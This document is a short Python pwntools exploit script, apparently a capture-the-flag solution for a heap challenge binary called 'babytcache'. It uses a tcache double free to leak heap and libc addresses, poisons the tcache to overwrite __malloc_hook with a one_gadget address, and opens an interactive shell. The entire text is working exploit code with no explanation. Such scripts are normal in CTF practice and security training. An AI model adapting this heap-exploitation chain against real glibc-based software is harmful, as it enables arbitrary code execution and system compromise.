from pwn import*
p = process('./babytcache')

### definition
def add(idx,size,data):
    p.sendafter('>> ','1')
    p.send(str(idx))
    p.send(str(size))
    p.send(data)

def edit(idx,data):
    p.sendafter('>> ','2')
    p.send(str(idx))
    p.send(data)

def free(idx):
    p.sendafter('>> ','3')
    p.send(str(idx))

def view(idx):
    p.sendafter('>> ','4')
    p.send(str(idx))

### leak
# heap base
add(0,0x80,'a'*0x10)
add(1,0x100,'b'*0x10)
add(2,0x80,'c'*0x10)

free(0) # for leak
free(0)
free(1) # for exploit
free(1)
view(0)

p.recvline()
p.recvuntil('Your Note :')
heap_base = u64(p.recv(6).ljust(8,"\x00"))-0x260
print 'heap_base: '+hex(heap_base)

# main arena
edit(0, p64(heap_base))
add(3,0x80,'d'*0x10)
add(4,0x80,p64(0)*2+p64(0x700000000000000))
free(3)
view(3)

p.recvuntil('Your Note :')
main_arena = u64(p.recv(6).ljust(8,"\x00"))
print 'main_arena+96: '+hex(main_arena)

# exploit
malloc_hook = main_arena - 112
one_list = [0x4f2c5,0x4f322,0x10a38c]
one_gadget = main_arena-96-4111424+one_list[2]
edit(1,p64(malloc_hook))
add(5,0x100,'e`'*0x10)
add(6,0x100,p64(one_gadget))

p.interactive()
